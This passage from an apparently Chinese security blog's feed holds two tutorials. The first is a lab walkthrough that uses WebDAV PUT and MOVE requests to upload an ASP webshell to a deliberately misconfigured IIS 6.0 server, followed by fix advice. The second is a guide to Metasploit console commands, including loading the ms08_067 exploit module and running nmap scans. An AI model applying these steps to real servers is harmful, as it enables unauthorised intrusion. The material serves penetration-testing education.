        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1308492&auto=1&height=66"></iframe><h2 id="IIS简介"><a href="#IIS简介" class="headerlink" title="IIS简介"></a>IIS简介</h2><p>iis是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。</p><p>最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。</p><p>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p><h2 id="Put漏洞造成原因"><a href="#Put漏洞造成原因" class="headerlink" title="Put漏洞造成原因"></a>Put漏洞造成原因</h2><p>IIS Server在Web服务扩展中开启了<code>WebDAV</code>，配置了可以<code>写入的权限</code>，造成<code>任意文件上传</code>。</p><h2 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1：安装VMware</span><br><span class="line"></span><br><span class="line">2：安装WIN2003</span><br><span class="line"></span><br><span class="line">3：配置网络连接</span><br><span class="line"></span><br><span class="line">4：安装IIS6.0(64bit)</span><br><span class="line"></span><br><span class="line">以上需要很长时间，安装完实验环境再看下面的文章</span><br></pre></td></tr></table></figure><p>VMware虚拟机选择的网络是.NET模式，或者桥接模式也可以！但前提必须让2003和物理机相互Ping通才可以！</p><p>有时候互相Ping不通可能是防火墙的原因，可以吧防火墙关闭就可以Ping通了</p><p>在这里我的物理机IP：<code>192.168.1.100</code></p><p>WIN2003的IP:<code>192.168.119.133</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/155.png" alt="图片"></p><p>然后配置完IIS后我们用物理机访问WIN2003的IP看看能不能打开网页：</p><p>访问：<a href="http://192.168.119.133/">http://192.168.119.133/</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/157.png" alt="图片"></p><p>说明是可以访问到的（一切就绪）</p><h2 id="需要用到的工具"><a href="#需要用到的工具" class="headerlink" title="需要用到的工具"></a>需要用到的工具</h2><p>IIS写权限的利用 - 桂林老兵：<a href="https://www.arpun.com/soft/13406.html">下载链接</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/156.png" alt="图片"></p><h2 id="IIS-PUT漏洞演示实战"><a href="#IIS-PUT漏洞演示实战" class="headerlink" title="IIS-PUT漏洞演示实战"></a>IIS-PUT漏洞演示实战</h2><p>首先来到Internet信息服务(IIS)管理器 - Web服务扩展：</p><p>可以看到WebDAV扩展是禁止的</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/158.png" alt="图片"></p><p>我们首先来上传一个文件试试，看看能不能上传成功：</p><p>上传IIS写权限的利用工具的相对路径下的text.txt文件</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/159.png" alt="图片"></p><p>选择PUT方式、域名填写WIN2003的IP地址、请求文件是相对路径下的text.txt文件：提交数据包：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/160.png" alt="图片"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">501</span> Not Implemented</span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">Server: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">MicrosoftOfficeWebServer: <span class="number">5.0</span>_Pub</span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">Date: Tue, <span class="number">23</span> Jul <span class="number">2019</span> <span class="number">04</span>:<span class="number">30</span>:<span class="number">21</span> GMT</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个时候利用工具返回的数据包是<code>501</code>的状态码，从这个利用软件返回的结果说明没有成功</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/161.png" alt="图片"></p><p>网站服务器里也没有上传成功</p><p>这个时候我们把WebDAV设置为允许、然后网站主目录下设置可写入权限：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/162.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/163.png" alt="图片"></p><p>这个时候就有可能照成任意文件上传，我们再来试试上传：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/164.png" alt="图片"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Tue, <span class="number">23</span> Jul <span class="number">2019</span> <span class="number">04</span>:<span class="number">58</span>:<span class="number">04</span> GMT</span><br><span class="line">Server: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">MicrosoftOfficeWebServer: <span class="number">5.0</span>_Pub</span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/165.png" alt="图片"></p><p>这个时候就可以上传txt文件了！</p><p>当然有时候我遇到返回状态码为:401、400的，是因为网站主目录没设置给<code>Everyone</code>权限才导致上传失败！</p><p>我们上传脚本文件asp试试：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/166.png" alt="图片"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Tue, <span class="number">23</span> Jul <span class="number">2019</span> <span class="number">05</span>:<span class="number">09</span>:<span class="number">47</span> GMT</span><br><span class="line">Server: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">MicrosoftOfficeWebServer: <span class="number">5.0</span>_Pub</span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务器看看上传成功没有：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/167.png" alt="图片"></p><p>很显然<code>shell.asp</code>没有成功上传上去</p><p>这个时候，利用工具有一个<code>MOVE</code>方式，我们再上传<code>shell.asp</code>木马上去试试：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/168.png" alt="图片"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">201</span> Created</span><br><span class="line">Date: Tue, <span class="number">23</span> Jul <span class="number">2019</span> <span class="number">05</span>:<span class="number">13</span>:<span class="number">17</span> GMT</span><br><span class="line">Server: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">MicrosoftOfficeWebServer: <span class="number">5.0</span>_Pub</span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">Location: http:<span class="comment">//www.pig.com/shell.asp</span></span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个时候成功上传一句话木马到服务器！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/169.png" alt="图片"></p><h2 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h2><p>1：关闭WebDAV</p><p>2：关闭写入权限</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit-基本使用和控制台命令</title>
      <link href="/2019/07/06/metasploit-2/"/>
      <url>/2019/07/06/metasploit-2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=4056608&auto=1&height=66"></iframe><blockquote><p>因为Kali Linux内预先配置好了Metasploit，所以就不用配置环境变量等等。</p></blockquote><p>终端输入：<code>Msfconsole</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/114.png" alt="图片"></p><p>这个时候就进入到了MSF的控制台，其中<code>TAB</code>键可以自动补全命令等等。</p><p><code>MSF</code>在控制台里可以执行这些命令：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/115.png" alt="图片"></p><h2 id="show命令详解"><a href="#show命令详解" class="headerlink" title="show命令详解"></a>show命令详解</h2><blockquote><p>Metasploit框架中包涵数百个模块，没有人能用脑子把它们的名字全部记下来。在MSF终端中运行show命令会把所有的模块显示出来，也可以指定模块的类型来缩小搜索范围。</p></blockquote><p>show 命令有这些： </p><p>这些命令会显示<code>Metasploit</code>框架中所有可用的渗透攻击模块。在MSF终端中，你可以针对渗透测试中发现的安全漏洞来实施相应的渗透攻击。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/116.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show auxiliary</span><br></pre></td></tr></table></figure><p>这个命令会显示所有的辅助模块以及他们的用途。在Metasploit中，辅助模块的用途非常广泛，它们可以是扫描器、拒绝服务攻击工具、Fuzz测试器，以及其他类型的工具。</p><p>当你选择了一个模块，并输入<code>msf &gt; show options</code>后，会列出这个模块所需的各种参数。如果当你没有选择任何模块，那么输入这个命令会显示所有的全局参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/117.png" alt="图片"></p><p><code>show missing</code>是查看哪些参数是需要配置的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show missing</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/118.png" alt="图片"></p><p>可以看到<code>RHOST</code>需要设置，但是我们没设置就是空的！</p><h2 id="search命令详解"><a href="#search命令详解" class="headerlink" title="search命令详解"></a>search命令详解</h2><blockquote><p>Metasploit提供了search命令。它可以在msf终端中执行。用户可以直接根据关键词，进行搜索。例如，search smb 搜索smb相关的模块。用户也可以指定关键词的类型。Metasploit将关键词分为app、author、bid、cve、edb、name、osvdb、platform、ref、type十种类型。这样，用户就可以通过指定不同类型的关键词，达到精确搜索。例如，search name:smb platform:windows 就可以搜索Windows平台的smb相关的模块。</p></blockquote><p>比如我们想要用<strong>ms10-046</strong>相关的模块就可以使用<code>search</code>命令：（类似于find命令）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms10-146</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/119.png" alt="图片"></p><p>其中<strong>search</strong>相关使用可以输入：<code>search -h</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/120.png" alt="图片"></p><p>假如我们要搜索<code>cve</code>里包含<strong>2018</strong>的，就可以这样搜索：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search cve:2018</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/121.png" alt="图片"></p><p>这样就可以快速搜索到我们想要的模块，不然搜索出来的都是一大堆眼花缭乱的。</p><p>假如我们要搜索<code>exploit</code>（攻击模块）类型的模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search <span class="built_in">type</span>:exploit</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/122.png" alt="图片"></p><h2 id="use命令详解"><a href="#use命令详解" class="headerlink" title="use命令详解"></a>use命令详解</h2><blockquote><p>如果找到了自己要用的攻击模块/辅助模块，就可以用use来调用该模块</p></blockquote><p>假如我们要用：<code>exploit/windows/smb/ms08_067_netapi</code> 这个模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/123.png" alt="图片"></p><p>这个时候就进入到了<code>exploit/windows/smb/ms08_067_netapi</code>这个模块里。</p><p>进入到模块里就可使用<code>info</code>查看当前模块的基本信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/124.png" alt="图片"><br><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/125.png" alt="图片"></p><h2 id="set命令详解"><a href="#set命令详解" class="headerlink" title="set命令详解"></a>set命令详解</h2><blockquote><p>如果选择好了相应的漏洞利用模块，就可以使用set命令来设置一些参数，如ip、端口等等</p></blockquote><p>查看当前设置情况:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shop options</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/126.png" alt="图片"></p><p>这个时候<code>RHOST</code>（攻击目标IP）是空的，我们就要设置一下：（攻击目标IP：1.1.1.1）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 1.1.1.1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/127.png" alt="图片"></p><p>这个时候再<code>show options</code>就可以看到<code>RHOST</code>已经设置为了<code>1.1.1.1</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/128.png" alt="图片"></p><h2 id="unset命令详解"><a href="#unset命令详解" class="headerlink" title="unset命令详解"></a>unset命令详解</h2><blockquote><p>如果你刚set设置了参数，你想取消掉刚刚的设置，那么就可以使用unset</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> RHOST</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/129.png" alt="图片"></p><h2 id="setg命令详解"><a href="#setg命令详解" class="headerlink" title="setg命令详解"></a>setg命令详解</h2><blockquote><p>setg这个命令是全局设置的意思，假如你想把所有的模块的RHOST设置为192.168.1.1，那么就可以使用setg</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg RHOST 192.168.1.1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/130.png" alt="图片"><br><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/131.png" alt="图片"></p><h4 id="unsetg和刚刚的unset是一样！"><a href="#unsetg和刚刚的unset是一样！" class="headerlink" title="unsetg和刚刚的unset是一样！"></a>unsetg和刚刚的unset是一样！</h4><h2 id="check命令详解"><a href="#check命令详解" class="headerlink" title="check命令详解"></a>check命令详解</h2><blockquote><p>如果你设置好一切参数后，可以使用check命令来探测目标IP、端口…是否存在ms08_067这个漏洞，只是去验证是否存在这个漏洞，并没有去利用它</p></blockquote><p>其中大部分的<code>exploit</code>攻击模块里，大部分都不能<code>check</code>验证漏洞（要么是利用漏洞，要么是不利用漏洞），一般不用到<code>check</code>，一般直接是去利用漏洞，而不是验证！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/132.png" alt="图片"></p><h2 id="back命令详解"><a href="#back命令详解" class="headerlink" title="back命令详解"></a>back命令详解</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/133.png" alt="图片"></p><p>如果想回到<code>MSF</code>更目录下，就可以使用<code>back</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; back</span><br><span class="line">msf &gt; </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/134.png" alt="图片"></p><h2 id="db-相关命令详解"><a href="#db-相关命令详解" class="headerlink" title="db_*相关命令详解"></a>db_*相关命令详解</h2><p>首先进入<code>MSF</code>控制台后，可以输入<code>db_status</code>查看数据库状态（后台数据库有没有连接上）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_status </span><br><span class="line">[*] postgresql selected, no connection</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/135.png" alt="图片"></p><p>显示：<strong>postgresql selected, no connection</strong>,说明还没有连接到数据库</p><p>这个时候回到<code>kali</code>终端输入命令：<code>msfdb start</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~<span class="comment"># msfdb start</span></span><br><span class="line">[+] Starting database</span><br></pre></td></tr></table></figure><p>这个时候输入命令(查看5432端口是否开放，开放说明postgresql数据库是开启的)：<code>netstat -pantu | grep 5432</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -pantu | grep 5432</span><br></pre></td></tr></table></figure><p>输入命令启动<code>postgresql</code>数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~<span class="comment"># service postgresql start</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/136.png" alt="图片"></p><p>查看5432端口是否开放:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~<span class="comment"># netstat -pantu | grep 5432</span></span><br><span class="line"></span><br><span class="line">tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      8031/postgres       </span><br><span class="line">tcp6       0      0 ::1:5432                :::*                    LISTEN      8031/postgres       </span><br></pre></td></tr></table></figure><p>如果还是这样的话：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/137.png" alt="图片"></p><p>那么就是初次使用数据库服务时需初始化，以便创建系统默认的数据库及数据库用户</p><p>命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfdb init（默认创建的数据库名：msf，msf_test;用户名：msf；口令默认为空）</span><br><span class="line">msf init msf msf_test msf</span><br><span class="line">msfdb reinit</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/138.png" alt="图片"></p><p>创建了数据库后，就可以连接到数据库了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_status </span><br><span class="line">[*] postgresql connected to msf</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/139.png" alt="图片"></p><p><strong>为什么要使用数据库呢？</strong></p><blockquote><p>其实不使用数据库也是可以使用MSF的，只是在信息收集发现那些机器存在漏洞，机器的账号密码没有办法存储下来，所以就需要用到msfdb（postgresql）数据库！</p></blockquote><h2 id="db-相关命令详解-1"><a href="#db-相关命令详解-1" class="headerlink" title="db_*相关命令详解"></a>db_*相关命令详解</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">db_connect         :  数据库连接信息</span><br><span class="line">db_export          : 数据库导出</span><br><span class="line">db_nmap            : 启动nmap扫描,并把结果保存到数据库中</span><br><span class="line">db_remove          :  数据库删除</span><br><span class="line">db_status          : 数据库连接状态</span><br><span class="line">db_disconnect      : 数据库断开连接</span><br><span class="line">db_import          : 导入到数据库</span><br><span class="line">db_rebuild_cache   : 把数据缓存到数据库,再次进行search搜索的时候就可以提高效率</span><br><span class="line">db_save            : 保存数据库</span><br><span class="line">hosts   　　　　      : 扫描主机记录</span><br><span class="line">hosts[xx.xx.xx.xx]: 显示特定主机的记录</span><br><span class="line">hosts -u  　　　     : 显示是开机状态的主机</span><br><span class="line">hosts -c　　　       : 后面跟上你想要看的列名,多个列之间逗号隔开</span><br><span class="line">hosts -S　　　       : Search缩写, 用于关键字匹配(多字段搜索)</span><br><span class="line">hosts -p　　　       : 端口搜索. 与-S不同的是只能精准匹配端口一项</span><br><span class="line">services     　  　 : 显示端口信息 (搜索规则和hosts等同),可以指定范围 例 : services -p 1-200</span><br></pre></td></tr></table></figure><h2 id="db-status"><a href="#db-status" class="headerlink" title="db_status"></a>db_status</h2><blockquote><p>查看msfdb数据库（postgresql）是否连接到了MSF</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_status </span><br><span class="line">[*] postgresql connected to msf</span><br><span class="line">这样就是连接到了MSF数据库</span><br></pre></td></tr></table></figure><h2 id="db-rebuild-cache"><a href="#db-rebuild-cache" class="headerlink" title="db_rebuild_cache"></a>db_rebuild_cache</h2><blockquote><p>把数据缓存到数据库,再次进行search搜索的时候就可以提高效率</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_rebuild_cache </span><br><span class="line">[*] Purging and rebuilding the module cache <span class="keyword">in</span> the background...</span><br></pre></td></tr></table></figure><h1 id="db-nmap"><a href="#db-nmap" class="headerlink" title="db_nmap"></a>db_nmap</h1><blockquote><p>这个其实就是集成在msf里的nmap里，只不过使用db_nmap扫描结果会保存到msf这个数据库里！</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_nmap 192.168.1.1</span><br><span class="line">[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-04 12:51 CST</span><br><span class="line">[*] Nmap: Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">[*] Nmap: Host is up (0.00070s latency).</span><br><span class="line">[*] Nmap: Not shown: 998 filtered ports</span><br><span class="line">[*] Nmap: PORT     STATE SERVICE</span><br><span class="line">[*] Nmap: 80/tcp   open  http</span><br><span class="line">[*] Nmap: 1900/tcp open  upnp</span><br><span class="line">[*] Nmap: MAC Address: C0:A5:DD:37:87:E8 (Shenzhen Mercury Communication Technologies)</span><br><span class="line">[*] Nmap: Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 4.94 seconds</span><br></pre></td></tr></table></figure><p>一旦使用<code>db_namp</code>对一个<code>IP</code>扫描并<code>成功扫描</code>后的结果会自动存储到数据库里：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac                name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---                ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">192.168.1.1  c0:a5:dd:37:87:e8        Unknown                    device         </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/140.png" alt="图片"></p><p>因为我们扫描的是<code>192.168.1.1</code>是<code>路由器</code>，显示不出什么效果，我就扫描我物理机<code>192.168.1.100</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_nmap 192.168.1.100</span><br><span class="line">[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-04 12:55 CST</span><br><span class="line">[*] Nmap: Nmap scan report <span class="keyword">for</span> 192.168.1.100</span><br><span class="line">[*] Nmap: Host is up (0.0021s latency).</span><br><span class="line">[*] Nmap: Not shown: 991 closed ports</span><br><span class="line">[*] Nmap: PORT      STATE SERVICE</span><br><span class="line">[*] Nmap: 135/tcp   open  msrpc</span><br><span class="line">[*] Nmap: 139/tcp   open  netbios-ssn</span><br><span class="line">[*] Nmap: 443/tcp   open  https</span><br><span class="line">[*] Nmap: 445/tcp   open  microsoft-ds</span><br><span class="line">[*] Nmap: 902/tcp   open  iss-realsecure</span><br><span class="line">[*] Nmap: 912/tcp   open  apex-mesh</span><br><span class="line">[*] Nmap: 49152/tcp open  unknown</span><br><span class="line">[*] Nmap: 49153/tcp open  unknown</span><br><span class="line">[*] Nmap: 49154/tcp open  unknown</span><br><span class="line">[*] Nmap: MAC Address: F4:B5:20:05:38:8A (Biostar Microtech international)</span><br><span class="line">[*] Nmap: Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.45 seconds</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/141.png" alt="图片"></p><p>这个时候又多出了一个IP、MAC地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------        ---                ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">192.168.1.1    c0:a5:dd:37:87:e8        Unknown                    device         </span><br><span class="line">192.168.1.100  f4:b5:20:05:38:8a        Unknown                    device         </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/142.png" alt="图片"></p><p>如果我们想要查看192.168.1.100主机的详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hosts 192.168.1.100</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/143.png" 